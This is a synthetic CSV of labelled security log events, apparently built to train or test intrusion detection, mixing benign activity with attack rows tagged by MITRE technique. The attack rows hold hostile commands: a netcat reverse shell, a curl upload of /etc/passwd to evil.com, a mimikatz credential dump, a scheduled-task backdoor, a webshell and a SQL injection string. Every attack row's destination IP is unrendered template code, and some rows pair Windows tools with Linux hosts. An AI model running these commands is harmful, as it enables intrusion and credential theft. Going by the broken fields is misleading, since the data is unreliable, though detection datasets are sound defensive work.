@timestamp,label,attack_name,mitre_technique,mitre_tactic,event.category,event.outcome,source.ip,source.port,destination.ip,destination.port,network.bytes,network.packets,agent.hostname,agent.type,user.name,process.pid,process.name,process.command_line,file_name,domain
2026-09-10T14:16:56.551796,benign,,,,authentication,success,192.168.1.125,5000,10.0.2.181,80,1372,80,srv20,linux,john.doe,4828,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-13T17:04:51.545848,attack,persistence,T1053,persistence,process,success,192.168.56.5,0,"10.0.0.{random.randint(1, 254)}",0,623,7,workstation100,linux,guest,1543,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-15T13:45:44.540606,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.7,19802,"10.0.0.{random.randint(1, 254)}",445,17756,422,app3,linux,administrator,8000,psexec.exe,,,
2026-09-11T11:50:03.546439,attack,persistence,T1053,persistence,process,success,192.168.56.2,0,"10.0.0.{random.randint(1, 254)}",0,766,2,workstation3,linux,guest,7592,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-13T00:10:20.554838,benign,,,,network,success,192.168.1.106,1024,10.0.0.18,53,9775,15,srv2,windows,john.doe,1560,systemd,explorer.exe,,
2026-09-10T10:58:51.540800,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.2,65217,"10.0.0.{random.randint(1, 254)}",22,1816,10,db4,linux,administrator,6665,powershell.exe,,,
2026-09-13T19:54:09.542949,attack,reverse_shell,T1059,execution,process,success,192.168.56.7,61188,"10.0.0.{random.randint(1, 254)}",4444,4113,23,mail10,linux,guest,1427,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-11T10:30:28.567450,benign,,,,authentication,success,192.168.1.91,4096,10.0.4.219,3306,2189,26,app50,windows,lisa.wilson,3154,systemd,apache2 -DFOREGROUND,,
2026-09-13T18:18:55.565950,benign,,,,authentication,success,192.168.1.196,2048,10.0.0.99,22,9399,67,web2,windows,david.moore,6793,explorer.exe,explorer.exe,,
2026-09-11T13:11:17.563143,benign,,,,authentication,success,192.168.1.139,4096,10.0.5.252,3306,7922,36,workstation2,windows,david.moore,9810,sshd,chrome.exe --profile-directory=Default,,
2026-09-10T02:11:09.546402,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.5,9191,"10.0.0.{random.randint(1, 254)}",443,876,57,web50,linux,test,7129,python3,,,evil-c2.com
2026-09-12T16:02:49.556990,benign,,,,network,success,192.168.1.27,3072,10.0.5.4,443,6993,81,app3,linux,sarah.jones,1227,nginx,chrome.exe --profile-directory=Default,,
2026-09-11T14:59:30.553036,benign,,,,network,success,192.168.1.209,4096,10.0.3.129,80,3635,49,mail1,linux,mark.wilson,3946,apache2,explorer.exe,,
2026-09-08T23:20:57.542056,attack,webshell,T1505,persistence,file,success,192.168.56.2,0,"10.0.0.{random.randint(1, 254)}",0,4834,3,backup1,windows,administrator,9512,php,php /var/www/html/shell.php,shell.php,
2026-09-13T02:07:08.566808,benign,,,,process,success,192.168.1.238,2048,10.0.4.178,80,9477,58,app10,windows,admin,3010,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-10T09:33:54.559444,benign,,,,process,success,192.168.1.50,8443,10.0.1.76,80,1129,30,srv5,windows,admin,7385,explorer.exe,explorer.exe,,
2026-09-11T16:37:08.561901,benign,,,,network,success,192.168.1.57,3072,10.0.3.42,53,3282,11,srv10,windows,sarah.jones,5028,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-12T10:22:53.570988,benign,,,,authentication,success,192.168.1.79,2048,10.0.3.32,443,1331,17,app20,linux,jane.smith,2554,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-15T02:43:38.558085,benign,,,,authentication,success,192.168.1.25,3072,10.0.5.18,80,4986,36,web20,windows,sarah.jones,4719,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-12T04:27:20.546666,attack,reverse_shell,T1059,execution,process,success,192.168.56.9,54344,"10.0.0.{random.randint(1, 254)}",4444,2019,2,mail10,linux,administrator,8964,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-15T03:59:11.562516,benign,,,,process,success,192.168.1.231,3072,10.0.3.116,22,7285,9,app10,linux,mike.brown,9037,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-09T18:44:11.541856,attack,credential_dump,T1003,credential_access,process,success,192.168.56.5,0,"10.0.0.{random.randint(1, 254)}",0,7356,8,db50,linux,admin,3254,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-14T11:58:01.563424,benign,,,,process,success,192.168.1.63,2048,10.0.2.186,53,9046,53,backup10,linux,emily.davis,1282,apache2,explorer.exe,,
2026-09-13T09:01:24.562315,benign,,,,authentication,success,192.168.1.196,2048,10.0.1.98,53,2179,19,workstation50,linux,david.moore,6344,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-13T07:20:01.543250,attack,credential_dump,T1003,credential_access,process,success,192.168.56.10,0,"10.0.0.{random.randint(1, 254)}",0,3588,1,srv5,windows,guest,9082,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-14T06:38:33.562453,benign,,,,authentication,success,192.168.1.96,5000,10.0.5.62,443,5750,47,srv100,windows,david.moore,3926,nginx,explorer.exe,,
2026-09-12T08:14:32.556388,benign,,,,authentication,success,192.168.1.8,4096,10.0.2.116,80,3429,8,backup20,linux,david.moore,9237,chrome.exe,apache2 -DFOREGROUND,,
2026-09-12T18:00:57.570280,benign,,,,network,success,192.168.1.245,4096,10.0.0.148,443,5879,74,backup4,linux,admin,202,firefox.exe,firefox.exe,,
2026-09-15T13:55:10.551861,benign,,,,network,success,192.168.1.161,2048,10.0.5.103,443,8502,13,app4,windows,chris.miller,9098,systemd,firefox.exe,,
2026-09-14T09:10:41.558131,benign,,,,authentication,success,192.168.1.29,4096,10.0.5.214,443,2707,59,srv3,windows,emily.davis,3231,sshd,apache2 -DFOREGROUND,,
2026-09-08T22:45:25.548852,benign,,,,process,success,192.168.1.99,8443,10.0.5.164,22,2726,20,srv4,linux,lisa.wilson,4018,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-14T08:29:21.568522,benign,,,,process,success,192.168.1.157,5000,10.0.2.6,80,6528,4,srv2,windows,lisa.wilson,4541,chrome.exe,firefox.exe,,
2026-09-10T17:07:54.566318,benign,,,,authentication,success,192.168.1.37,5000,10.0.1.51,443,4052,28,app10,linux,lisa.wilson,6160,chrome.exe,firefox.exe,,
2026-09-15T13:18:49.560771,benign,,,,network,success,192.168.1.44,1024,10.0.2.119,443,3231,33,backup3,linux,mark.wilson,1541,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-12T02:50:56.562870,benign,,,,authentication,success,192.168.1.83,3072,10.0.2.209,53,7240,31,db50,windows,david.moore,5321,apache2,firefox.exe,,
2026-09-15T07:28:00.565296,benign,,,,network,success,192.168.1.70,5000,10.0.3.45,3306,2628,40,mail50,windows,mike.brown,4106,systemd,firefox.exe,,
2026-09-13T14:16:40.562608,benign,,,,process,success,192.168.1.83,8443,10.0.3.177,3306,7114,83,web2,windows,sarah.jones,8164,nginx,apache2 -DFOREGROUND,,
2026-09-10T08:53:12.543533,attack,persistence,T1053,persistence,process,success,192.168.56.2,0,"10.0.0.{random.randint(1, 254)}",0,153,1,backup10,linux,guest,7114,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-13T09:10:29.560143,benign,,,,authentication,success,192.168.1.173,1024,10.0.2.185,22,3538,35,web2,windows,sarah.jones,1171,sshd,explorer.exe,,
2026-09-10T10:55:16.554175,benign,,,,authentication,success,192.168.1.53,3072,10.0.2.15,22,1150,51,web100,windows,john.doe,2257,firefox.exe,firefox.exe,,
2026-09-11T08:24:03.565196,benign,,,,network,success,192.168.1.67,4096,10.0.5.59,53,5388,40,srv20,windows,jane.smith,176,sshd,explorer.exe,,
2026-09-13T18:41:02.543523,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.1,39043,"10.0.0.{random.randint(1, 254)}",445,25881,304,workstation4,windows,guest,741,psexec.exe,,,
2026-09-14T17:58:59.554948,benign,,,,process,success,192.168.1.204,1024,10.0.1.172,3306,7565,4,backup1,windows,mark.wilson,1258,firefox.exe,firefox.exe,,
2026-09-13T02:15:32.547977,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.6,34367,"10.0.0.{random.randint(1, 254)}",445,31947,130,srv4,windows,admin,1558,psexec.exe,,,
2026-09-09T03:58:24.568470,benign,,,,network,success,192.168.1.110,3072,10.0.5.139,3306,146,68,backup20,windows,john.doe,2306,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-15T10:29:52.570955,benign,,,,network,success,192.168.1.23,4096,10.0.3.106,80,9245,53,app4,windows,mark.wilson,5135,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-09T19:08:14.570217,benign,,,,network,success,192.168.1.71,1024,10.0.0.23,53,627,95,workstation2,windows,lisa.wilson,5448,firefox.exe,explorer.exe,,
2026-09-08T21:20:41.560049,benign,,,,process,success,192.168.1.16,8443,10.0.5.157,53,4092,51,mail4,windows,lisa.wilson,2953,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T11:14:26.566971,benign,,,,network,success,192.168.1.222,5000,10.0.0.96,443,1152,75,srv2,windows,lisa.wilson,2506,explorer.exe,apache2 -DFOREGROUND,,
2026-09-15T04:30:45.560640,benign,,,,network,success,192.168.1.201,3072,10.0.5.35,3306,7780,21,web2,linux,david.moore,4838,apache2,chrome.exe --profile-directory=Default,,
2026-09-15T05:39:07.559929,benign,,,,authentication,success,192.168.1.47,4096,10.0.2.212,443,6525,7,workstation4,windows,mark.wilson,3514,systemd,explorer.exe,,
2026-09-09T02:18:14.552659,benign,,,,process,success,192.168.1.252,5000,10.0.5.160,3306,3613,70,web100,windows,mike.brown,7832,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-10T15:03:47.546797,attack,credential_dump,T1003,credential_access,process,success,192.168.56.10,0,"10.0.0.{random.randint(1, 254)}",0,3274,9,workstation5,windows,administrator,8519,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-15T09:44:25.570597,benign,,,,network,success,192.168.1.98,4096,10.0.2.82,3306,8410,71,srv10,linux,emily.davis,2056,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-11T06:26:12.563846,benign,,,,process,success,192.168.1.210,8443,10.0.4.52,443,7237,93,mail2,windows,admin,2117,systemd,firefox.exe,,
2026-09-11T08:41:51.550994,benign,,,,process,success,192.168.1.64,5000,10.0.0.59,53,1546,77,backup3,linux,mike.brown,8197,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-13T14:04:51.556176,benign,,,,network,success,192.168.1.144,5000,10.0.1.102,443,5187,11,workstation100,windows,mark.wilson,4787,apache2,chrome.exe --profile-directory=Default,,
2026-09-13T09:53:58.564239,benign,,,,network,success,192.168.1.187,2048,10.0.3.192,3306,9990,36,web20,windows,david.moore,5335,firefox.exe,apache2 -DFOREGROUND,,
2026-09-10T02:44:37.570739,benign,,,,process,success,192.168.1.34,2048,10.0.5.24,443,4158,45,db1,windows,admin,2846,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-09T17:05:41.563605,benign,,,,authentication,success,192.168.1.99,5000,10.0.0.94,3306,8655,88,workstation5,linux,lisa.wilson,9080,sshd,chrome.exe --profile-directory=Default,,
2026-09-11T03:22:50.564122,benign,,,,authentication,success,192.168.1.235,1024,10.0.5.121,3306,4692,100,srv20,linux,chris.miller,8467,apache2,chrome.exe --profile-directory=Default,,
2026-09-09T12:53:35.554905,benign,,,,file,success,192.168.1.196,8443,10.0.4.217,22,9382,6,backup100,linux,chris.miller,7048,nginx,firefox.exe,,
2026-09-11T08:54:29.540665,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.6,39551,"10.0.0.{random.randint(1, 254)}",445,12561,395,web4,windows,administrator,1333,psexec.exe,,,
2026-09-13T20:38:31.570708,benign,,,,authentication,success,192.168.1.37,5000,10.0.4.147,22,5836,88,workstation5,windows,lisa.wilson,9175,explorer.exe,apache2 -DFOREGROUND,,
2026-09-11T23:11:00.546542,attack,webshell,T1505,persistence,file,success,192.168.56.1,0,"10.0.0.{random.randint(1, 254)}",0,2928,4,srv4,windows,admin,5841,php,php /var/www/html/shell.php,shell.php,
2026-09-15T04:04:22.565408,benign,,,,authentication,success,192.168.1.248,4096,10.0.3.139,443,2532,74,srv5,windows,sarah.jones,5704,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-08T21:40:40.560107,benign,,,,file,success,192.168.1.14,3072,10.0.0.90,80,5551,63,mail4,windows,chris.miller,3489,systemd,apache2 -DFOREGROUND,,
2026-09-14T18:12:16.564669,benign,,,,authentication,success,192.168.1.107,5000,10.0.5.82,3306,2022,91,backup10,linux,john.doe,7905,chrome.exe,apache2 -DFOREGROUND,,
2026-09-11T23:36:56.546370,attack,port_scan,T1046,discovery,network,success,192.168.56.2,24327,"10.0.0.{random.randint(1, 254)}",443,1669,19,db10,linux,test,6263,python3,,,
2026-09-09T03:25:46.568586,benign,,,,network,success,192.168.1.148,5000,10.0.3.212,443,9558,47,app3,windows,lisa.wilson,1378,systemd,chrome.exe --profile-directory=Default,,
2026-09-10T08:02:28.546997,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.5,23036,"10.0.0.{random.randint(1, 254)}",22,1425,14,db20,windows,administrator,3678,powershell.exe,,,
2026-09-12T09:02:32.564791,benign,,,,authentication,success,192.168.1.210,2048,10.0.5.196,3306,1711,75,db50,linux,mark.wilson,1485,chrome.exe,explorer.exe,,
2026-09-14T23:58:05.548183,attack,sql_injection,T1190,initial_access,web,success,192.168.56.2,13568,"10.0.0.{random.randint(1, 254)}",80,3503,46,mail4,windows,administrator,3374,bash,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-11T21:37:42.558971,benign,,,,authentication,success,192.168.1.52,5000,10.0.0.90,22,8702,99,backup50,linux,sarah.jones,3985,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-09T04:30:33.568433,benign,,,,network,success,192.168.1.254,8443,10.0.0.101,80,7368,15,app2,linux,david.moore,3646,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-13T12:12:56.552590,benign,,,,process,success,192.168.1.149,2048,10.0.2.38,443,3345,25,workstation3,linux,mike.brown,2792,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-10T11:03:35.544824,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.9,62712,"10.0.0.{random.randint(1, 254)}",445,37485,164,db50,windows,administrator,6384,psexec.exe,,,
2026-09-10T07:27:45.569864,benign,,,,network,success,192.168.1.180,3072,10.0.3.17,443,1527,50,db2,windows,david.moore,6721,explorer.exe,apache2 -DFOREGROUND,,
2026-09-10T02:36:13.563430,benign,,,,network,success,192.168.1.200,4096,10.0.2.12,53,1268,84,db5,linux,chris.miller,448,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-09T12:53:29.547819,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.5,61303,"10.0.0.{random.randint(1, 254)}",443,6398,70,backup10,windows,administrator,5678,powershell.exe,,,evil-c2.com
2026-09-11T05:40:19.554296,benign,,,,process,success,192.168.1.186,8443,10.0.0.227,3306,7293,19,web2,linux,emily.davis,6815,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-13T10:25:09.568800,benign,,,,authentication,success,192.168.1.233,5000,10.0.3.120,80,4061,40,mail3,linux,sarah.jones,6811,systemd,chrome.exe --profile-directory=Default,,
2026-09-09T18:27:06.569851,benign,,,,authentication,success,192.168.1.220,5000,10.0.2.100,443,8633,28,web20,linux,david.moore,5263,systemd,chrome.exe --profile-directory=Default,,
2026-09-09T08:44:13.546002,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.3,5228,"10.0.0.{random.randint(1, 254)}",443,2462,31,backup4,windows,admin,2887,bash,,,evil-c2.com
2026-09-11T22:39:46.559235,benign,,,,authentication,success,192.168.1.124,1024,10.0.1.126,443,7477,8,app4,windows,john.doe,5022,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-12T11:43:34.552653,benign,,,,network,success,192.168.1.224,4096,10.0.2.212,22,5511,84,srv20,linux,mike.brown,1107,explorer.exe,explorer.exe,,
2026-09-10T19:53:22.546086,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.4,31100,"10.0.0.{random.randint(1, 254)}",8080,65638,142,srv1,linux,administrator,9092,python3,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-11T02:13:57.551047,benign,,,,network,success,192.168.1.127,1024,10.0.0.118,3306,9796,17,db1,windows,jane.smith,2196,firefox.exe,apache2 -DFOREGROUND,,
2026-09-14T16:03:54.545227,attack,persistence,T1053,persistence,process,success,192.168.56.5,0,"10.0.0.{random.randint(1, 254)}",0,203,8,web10,linux,guest,1321,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-14T04:29:45.567081,benign,,,,process,success,192.168.1.199,2048,10.0.5.46,22,4105,55,db1,linux,chris.miller,4191,explorer.exe,firefox.exe,,
2026-09-15T03:32:19.546895,attack,persistence,T1053,persistence,process,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,701,9,app10,linux,administrator,6696,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-09T15:28:37.568838,benign,,,,network,success,192.168.1.86,1024,10.0.2.99,53,8239,81,web5,linux,mike.brown,7263,systemd,explorer.exe,,
2026-09-14T12:16:25.568380,benign,,,,authentication,success,192.168.1.176,2048,10.0.2.171,443,586,42,mail5,windows,john.doe,1395,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-10T16:47:02.562901,benign,,,,network,success,192.168.1.186,5000,10.0.0.102,80,3599,57,srv50,windows,sarah.jones,4285,firefox.exe,firefox.exe,,
2026-09-14T00:05:29.543736,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.6,28013,"10.0.0.{random.randint(1, 254)}",445,15160,439,app4,linux,root,723,psexec.exe,,,
2026-09-10T17:37:43.557292,benign,,,,network,success,192.168.1.50,2048,10.0.0.154,53,5376,91,srv5,linux,david.moore,4904,chrome.exe,apache2 -DFOREGROUND,,
2026-09-12T20:39:49.567034,benign,,,,network,success,192.168.1.102,1024,10.0.4.21,53,8648,90,mail3,windows,mark.wilson,7552,systemd,chrome.exe --profile-directory=Default,,
2026-09-15T08:26:01.571250,benign,,,,process,success,192.168.1.19,8443,10.0.4.143,22,9017,46,app3,windows,sarah.jones,8843,apache2,chrome.exe --profile-directory=Default,,
2026-09-09T19:13:05.541539,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.8,59157,"10.0.0.{random.randint(1, 254)}",53,63093,479,web3,linux,admin,7927,bash,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-11T03:49:42.568715,benign,,,,network,success,192.168.1.126,8443,10.0.3.199,443,6091,2,workstation20,windows,emily.davis,7671,explorer.exe,firefox.exe,,
2026-09-13T12:23:37.549663,benign,,,,process,success,192.168.1.112,2048,10.0.5.217,443,5673,59,app20,windows,admin,2813,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-14T16:20:49.542568,attack,reverse_shell,T1059,execution,process,success,192.168.56.1,57090,"10.0.0.{random.randint(1, 254)}",4444,2930,44,workstation4,linux,administrator,1309,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-09T08:41:18.566757,benign,,,,network,success,192.168.1.214,4096,10.0.3.19,80,9025,10,web4,windows,sarah.jones,6774,systemd,chrome.exe --profile-directory=Default,,
2026-09-10T00:35:24.553079,benign,,,,network,success,192.168.1.36,5000,10.0.3.186,443,279,81,app2,linux,mark.wilson,3964,firefox.exe,explorer.exe,,
2026-09-09T00:41:18.548349,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.10,55700,"10.0.0.{random.randint(1, 254)}",443,3528,62,backup2,linux,guest,4071,bash,,,evil-c2.com
2026-09-13T12:18:18.544443,attack,sql_injection,T1190,initial_access,web,success,192.168.56.3,32990,"10.0.0.{random.randint(1, 254)}",80,1422,39,app50,linux,root,6100,python3,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-10T06:40:46.540367,attack,credential_dump,T1003,credential_access,process,success,192.168.56.2,0,"10.0.0.{random.randint(1, 254)}",0,6711,5,workstation100,linux,admin,3549,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-10T18:12:23.546936,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.6,57888,"10.0.0.{random.randint(1, 254)}",443,9139,71,mail3,linux,administrator,8126,python3,,,evil-c2.com
2026-09-13T21:50:53.549902,benign,,,,network,success,192.168.1.139,4096,10.0.2.72,22,9231,75,app10,linux,mike.brown,805,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-12T22:48:29.560124,benign,,,,file,success,192.168.1.106,1024,10.0.4.95,3306,3739,33,db20,linux,emily.davis,2087,sshd,apache2 -DFOREGROUND,,
2026-09-12T11:54:18.543588,attack,sql_injection,T1190,initial_access,web,success,192.168.56.5,42039,"10.0.0.{random.randint(1, 254)}",80,3973,19,web20,windows,test,2522,cmd.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-09T15:19:00.559966,benign,,,,network,success,192.168.1.156,4096,10.0.4.47,22,5411,44,srv50,windows,john.doe,2483,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-15T13:17:03.567734,benign,,,,network,success,192.168.1.47,2048,10.0.0.137,3306,4054,14,db4,windows,admin,4976,chrome.exe,explorer.exe,,
2026-09-10T13:31:16.569679,benign,,,,process,success,192.168.1.238,2048,10.0.0.196,443,1951,23,app20,windows,emily.davis,7198,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-09T20:36:30.548655,benign,,,,authentication,success,192.168.1.161,5000,10.0.1.51,443,8156,61,backup10,linux,sarah.jones,6349,chrome.exe,apache2 -DFOREGROUND,,
2026-09-12T01:54:31.548115,attack,webshell,T1505,persistence,file,success,192.168.56.2,0,"10.0.0.{random.randint(1, 254)}",0,7210,5,backup1,windows,guest,7372,php,php /var/www/html/shell.php,shell.php,
2026-09-11T13:32:28.551755,benign,,,,file,success,192.168.1.174,4096,10.0.3.75,443,3971,41,backup2,linux,sarah.jones,9423,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T22:51:30.542331,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.8,20732,"10.0.0.{random.randint(1, 254)}",445,28886,219,web10,windows,test,195,psexec.exe,,,
2026-09-09T15:21:35.547704,attack,credential_dump,T1003,credential_access,process,success,192.168.56.1,0,"10.0.0.{random.randint(1, 254)}",0,1552,10,web3,linux,test,8662,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-13T16:42:19.543598,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.9,14046,"10.0.0.{random.randint(1, 254)}",443,79204,334,web1,windows,test,5310,python3,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-10T01:11:08.541567,attack,credential_dump,T1003,credential_access,process,success,192.168.56.6,0,"10.0.0.{random.randint(1, 254)}",0,1845,1,srv4,windows,root,4776,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-11T20:45:07.561028,benign,,,,authentication,success,192.168.1.24,5000,10.0.4.242,443,1243,29,mail4,windows,emily.davis,1451,explorer.exe,explorer.exe,,
2026-09-11T22:42:15.552367,benign,,,,file,success,192.168.1.168,4096,10.0.2.99,22,5862,29,app100,linux,admin,2987,sshd,apache2 -DFOREGROUND,,
2026-09-12T22:52:41.544842,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.1,24422,"10.0.0.{random.randint(1, 254)}",443,9960,52,srv20,windows,admin,8574,bash,,,evil-c2.com
2026-09-09T07:10:23.546365,attack,reverse_shell,T1059,execution,process,success,192.168.56.9,8021,"10.0.0.{random.randint(1, 254)}",4444,3439,21,mail20,linux,test,2887,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-10T17:48:52.567229,benign,,,,authentication,success,192.168.1.151,8443,10.0.1.210,22,8477,98,db2,linux,mike.brown,1432,nginx,chrome.exe --profile-directory=Default,,
2026-09-09T03:05:33.569972,benign,,,,process,success,192.168.1.133,2048,10.0.2.133,3306,9885,16,mail50,linux,mike.brown,8439,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-09T17:09:35.562940,benign,,,,network,success,192.168.1.153,8443,10.0.2.150,3306,9632,41,db50,linux,john.doe,2135,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-15T00:04:38.561445,benign,,,,process,success,192.168.1.198,3072,10.0.2.204,53,368,74,web3,linux,lisa.wilson,4462,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-09T07:46:13.559199,benign,,,,process,success,192.168.1.30,1024,10.0.2.242,443,4453,59,db5,windows,mike.brown,9924,systemd,apache2 -DFOREGROUND,,
2026-09-15T03:32:02.557007,benign,,,,network,success,192.168.1.35,3072,10.0.2.6,80,7522,8,srv100,linux,lisa.wilson,5291,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-14T06:44:27.554155,benign,,,,process,success,192.168.1.135,1024,10.0.5.132,443,1383,100,mail20,linux,mike.brown,786,apache2,apache2 -DFOREGROUND,,
2026-09-15T10:44:37.566436,benign,,,,process,success,192.168.1.214,8443,10.0.1.238,80,2584,71,mail100,windows,mike.brown,5041,chrome.exe,firefox.exe,,
2026-09-15T08:30:56.563154,benign,,,,process,success,192.168.1.164,1024,10.0.0.121,22,1784,62,backup100,linux,sarah.jones,8937,chrome.exe,firefox.exe,,
2026-09-15T03:10:17.558678,benign,,,,network,success,192.168.1.59,3072,10.0.4.92,53,1725,86,backup2,linux,mark.wilson,7146,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-09T07:24:04.566796,benign,,,,authentication,success,192.168.1.93,4096,10.0.5.239,3306,9112,40,mail50,windows,sarah.jones,7844,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-10T01:34:22.544798,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.5,30608,"10.0.0.{random.randint(1, 254)}",53,80190,330,mail5,linux,guest,1375,cmd.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-14T05:44:45.566425,benign,,,,network,success,192.168.1.56,4096,10.0.5.254,3306,352,1,srv3,windows,emily.davis,2393,apache2,chrome.exe --profile-directory=Default,,
2026-09-12T23:11:40.563131,benign,,,,authentication,success,192.168.1.28,8443,10.0.1.201,80,8122,37,db50,linux,mark.wilson,8531,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-09T10:25:09.544469,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.3,4159,"10.0.0.{random.randint(1, 254)}",445,3438,353,web50,linux,admin,5071,psexec.exe,,,
2026-09-08T17:53:19.569211,benign,,,,network,success,192.168.1.184,2048,10.0.0.206,22,394,68,app1,windows,sarah.jones,7169,apache2,explorer.exe,,
2026-09-11T14:11:37.555627,benign,,,,process,success,192.168.1.146,2048,10.0.5.187,22,1450,60,backup2,windows,jane.smith,239,systemd,chrome.exe --profile-directory=Default,,
2026-09-11T12:28:19.543720,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.1,36830,"10.0.0.{random.randint(1, 254)}",22,609,6,web1,linux,test,4493,cmd.exe,,,
2026-09-10T13:24:42.554170,benign,,,,process,success,192.168.1.189,5000,10.0.2.35,22,1736,15,web20,windows,john.doe,8073,sshd,sshd: /usr/sbin/sshd [listener],,
